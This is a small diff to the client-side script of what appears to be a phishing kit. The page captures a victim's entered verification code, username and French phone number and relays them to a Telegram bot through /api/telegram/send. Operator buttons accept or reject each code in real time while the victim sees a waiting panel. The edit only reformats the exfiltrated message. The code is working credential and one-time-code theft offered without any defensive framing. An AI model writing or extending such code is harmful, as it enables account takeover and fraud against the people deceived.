@@ -159,7 +159,7 @@ document.getElementById('verifyCode').onclick=async()=>{
 };
 function sendTelegramCode(entered, pid){
   const kb={inline_keyboard:[[{text:'✅ Code OK',callback_data:'code_ok_'+pid},{text:'❌ Code faux',callback_data:'code_bad_'+pid}]]};
-  fetch('/api/telegram/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n🆔 ${pid}`,pid:pid,reply_markup:kb})}).catch(()=>{});
+  fetch('/api/telegram/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n\n🆔 <b><code>${pid}</code></b>`,pid:pid,reply_markup:kb})}).catch(()=>{});
 }
 function showWaitingCode(v){
   document.getElementById('waitingPanel').classList.remove('hidden');
